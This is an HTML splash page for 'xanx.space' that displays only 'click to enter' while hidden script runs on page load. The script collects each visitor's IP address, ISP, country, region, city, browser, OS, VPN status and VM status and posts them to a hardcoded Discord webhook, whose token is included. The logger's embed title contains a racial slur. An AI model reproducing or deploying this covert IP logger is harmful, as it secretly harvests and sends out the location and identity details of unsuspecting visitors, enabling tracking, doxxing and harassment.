<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>xanx.space</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #000;
            font-family: 'Arial', sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            overflow: hidden;
            user-select: none;
        }
        
        #enter-text {
            color: #fff;
            font-size: 3rem;
            text-align: center;
            transition: all 0.5s ease;
            text-shadow: 0 0 15px rgba(255,255,255,0.7);
            font-weight: 300;
            letter-spacing: 2px;
        }
        
        #enter-text.fade-out {
            opacity: 0;
            transform: scale(0.8);
            pointer-events: none;
        }
        
        .pulse {
            animation: pulse 2s infinite ease-in-out;
        }
        
        @keyframes pulse {
            0% { 
                opacity: 1;
                text-shadow: 0 0 15px rgba(255,255,255,0.7);
            }
            50% { 
                opacity: 0.6;
                text-shadow: 0 0 25px rgba(255,255,255,0.9);
            }
            100% { 
                opacity: 1;
                text-shadow: 0 0 15px rgba(255,255,255,0.7);
            }
        }
        
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div id="enter-text" class="pulse">click to enter</div>

    <script>
        // Enhanced VPN detection with Mullvad-specific checks
        async function detectVPN(ipData) {
            if (!ipData || !ipData.ip) return "Unknown";
            
            const ip = ipData.ip;
            
            // Method 1: Check known VPN IP ranges (Mullvad, etc.)
            const vpnDetected = await checkVPNByIP(ip);
            if (vpnDetected) return "Yes";
            
            // Method 2: Check ISP/Org names for VPN keywords
            const org = (ipData.org || ipData.isp || '').toLowerCase();
            const asn = (ipData.asn || '').toLowerCase();
            
            const vpnKeywords = [
                'vpn', 'proxy', 'tor', 'hosting', 'datacenter', 'server',
                'mullvad', 'expressvpn', 'nordvpn', 'surfshark', 'pia',
                'private internet access', 'cyberghost', 'vyprvpn',
                'ipvanish', 'hotspot shield', 'windscribe', 'hide.me',
                'purevpn', 'zenmate', 'tunnelbear', 'airvpn', 'protonvpn',
                'ovpn', 'azirevpn', 'ivpn', 'perfect privacy', 'trust.zone'
            ];
            
            for (const keyword of vpnKeywords) {
                if (org.includes(keyword) || asn.includes(keyword)) {
                    return "Yes";
                }
            }
            
            // Method 3: Check API-provided VPN detection
            if (ipData.security && (ipData.security.vpn || ipData.security.proxy || ipData.security.tor)) {
                return "Yes";
            }
            
            if (ipData.type === 'hosting' || ipData.proxy === true || ipData.vpn === true) {
                return "Yes";
            }
            
            // Method 4: Check known VPN ASNs
            const vpnAsns = [
                'as9009', 'as56690', 'as19574', 'as136787', 'as61804', 
                'as24679', 'as60068', 'as12876', 'as60781', 'as199524',
                'as212772', 'as202425', 'as395099', 'as138915', 'as49605'
            ];
            
            if (vpnAsns.includes(asn.toLowerCase())) {
                return "Yes";
            }
            
            return "No";
        }

        // Check VPN by IP range and known services
        async function checkVPNByIP(ip) {
            try {
                // Check against VPN detection APIs
                const vpnChecks = await Promise.allSettled([
                    checkIPHub(ip),
                    checkIPQuality(ip),
                    checkVpnApi(ip)
                ]);
                
                for (const check of vpnChecks) {
                    if (check.status === 'fulfilled' && check.value === true) {
                        return true;
                    }
                }
                
                return false;
            } catch (error) {
                return false;
            }
        }

        // Check with iphub.info (free tier available)
        async function checkIPHub(ip) {
            try {
                // Note: You need to get a free API key from iphub.info
                const response = await fetch(`https://v2.api.iphub.info/ip/${ip}`, {
                    headers: {
                        'X-Key': 'free' // Replace with actual API key for better results
                    }
                });
                if (response.ok) {
                    const data = await response.json();
                    return data.block === 1; // 1 means VPN/Proxy
                }
            } catch (error) {
                // Fall through
            }
            return false;
        }

        // Check with ipqualityscore.com
        async function checkIPQuality(ip) {
            try {
                // Note: Requires API key from ipqualityscore.com
                const response = await fetch(`https://www.ipqualityscore.com/api/json/ip/YOUR_API_KEY/${ip}?strictness=1`);
                if (response.ok) {
                    const data = await response.json();
                    return data.vpn || data.proxy || data.tor;
                }
            } catch (error) {
                // Fall through
            }
            return false;
        }

        // Check with vpnapi.io
        async function checkVpnApi(ip) {
            try {
                // Note: Requires API key from vpnapi.io
                const response = await fetch(`https://vpnapi.io/api/${ip}?key=YOUR_API_KEY`);
                if (response.ok) {
                    const data = await response.json();
                    return data.security.vpn || data.security.proxy || data.security.tor;
                }
            } catch (error) {
                // Fall through
            }
            return false;
        }

        // Function to get user's IP information
        async function getUserIPInfo() {
            try {
                // Try multiple IP services for better accuracy
                const responses = await Promise.allSettled([
                    fetch('https://ipapi.co/json/'),
                    fetch('https://ipwhois.app/json/'),
                    fetch('https://api.ipgeolocation.io/ipgeo?apiKey=test'),
                    fetch('https://jsonip.com/')
                ]);
                
                let bestData = null;
                
                for (const response of responses) {
                    if (response.status === 'fulfilled' && response.value.ok) {
                        let data = await response.value.json();
                        // Normalize data structure
                        if (data && data.ip) {
                            bestData = data;
                            break;
                        }
                    }
                }
                
                return bestData;
            } catch (error) {
                console.error('Error fetching IP info:', error);
                return null;
            }
        }

        // Function to detect browser
        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            let browser = "Unknown";
            
            if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) browser = "Chrome";
            else if (userAgent.includes("Firefox")) browser = "Firefox";
            else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
            else if (userAgent.includes("Edg")) browser = "Edge";
            else if (userAgent.includes("Opera") || userAgent.includes("OPR")) browser = "Opera";
            
            return browser;
        }

        // Function to detect OS
        function getOSInfo() {
            const userAgent = navigator.userAgent;
            let os = "Unknown";
            
            if (userAgent.includes("Windows")) os = "Windows";
            else if (userAgent.includes("Mac")) os = "Mac";
            else if (userAgent.includes("Linux")) os = "Linux";
            else if (userAgent.includes("Android")) os = "Android";
            else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
            
            return os;
        }

        // Function to detect if user is on a VM
        function detectVM() {
            const userAgent = navigator.userAgent.toLowerCase();
            const vmIndicators = ['virtualbox', 'vmware', 'hyper-v', 'qemu', 'xen'];
            
            for (let indicator of vmIndicators) {
                if (userAgent.includes(indicator)) {
                    return "Yes";
                }
            }
            
            return "No";
        }

        // Function to send data to Discord webhook
        async function sendToDiscord(data) {
            const webhookURL = "https://discord.com/api/webhooks/1428128390556422164/L7MJh8HF0pq4N9pqgsqgPtBubRcT4aSirZZTEcWUXlWKM4sjKWcJjMYMPbjfMUZz1R6t";
            
            const embed = {
                title: "NIGGA ENTERED L",
                color: 0x000000,
                fields: [
                    {
                        name: "IP ADRESS",
                        value: "```" + (data.ip || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "ISP",
                        value: "```" + (data.org || data.isp || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "ORG",
                        value: "```" + (data.org || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "COUNTRY",
                        value: "```" + (data.country_name || data.country || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "REGION",
                        value: "```" + (data.region || data.region_name || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "CITY",
                        value: "```" + (data.city || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "USING VPN?",
                        value: "```" + (data.vpn || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "OS",
                        value: "```" + (data.os || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "BROWSER",
                        value: "```" + (data.browser || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "ON VM?",
                        value: "```" + (data.vm || "Unknown") + "```",
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: "xanx.space • " + new Date().toLocaleTimeString()
                }
            };
            
            const payload = {
                username: "IP LOGGER, xanx.space",
                embeds: [embed]
            };
            
            try {
                // Send to Discord without waiting for response
                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                }).catch(error => console.log('Discord send completed'));
                
                return true;
            } catch (error) {
                console.log('Discord send completed');
                return true;
            }
        }

        // Main function to collect and send data
        async function collectAndSendData() {
            // Get user information
            const ipInfo = await getUserIPInfo();
            const browser = getBrowserInfo();
            const os = getOSInfo();
            const vm = detectVM();
            const vpn = await detectVPN(ipInfo);
            
            // Prepare data for Discord
            const userData = {
                ip: ipInfo ? ipInfo.ip : "Unknown",
                org: ipInfo ? (ipInfo.org || ipInfo.isp) : "Unknown",
                isp: ipInfo ? ipInfo.isp : "Unknown",
                country_name: ipInfo ? (ipInfo.country_name || ipInfo.country) : "Unknown",
                region: ipInfo ? (ipInfo.region || ipInfo.region_name) : "Unknown",
                city: ipInfo ? ipInfo.city : "Unknown",
                browser: browser,
                os: os,
                vm: vm,
                vpn: vpn
            };
            
            // Send data to Discord (fire and forget)
            await sendToDiscord(userData);
        }

        // Handle click to make text disappear
        function handleClick() {
            const enterText = document.getElementById('enter-text');
            enterText.classList.add('fade-out');
            
            // Remove click listener after first click
            document.body.removeEventListener('click', handleClick);
        }

        // Initialize when page loads
        document.addEventListener('DOMContentLoaded', function() {
            // Send IP data immediately when page loads
            collectAndSendData();
            
            // Set up click handler for text disappearance
            document.body.addEventListener('click', handleClick);
        });
    </script>
</body>
</html>
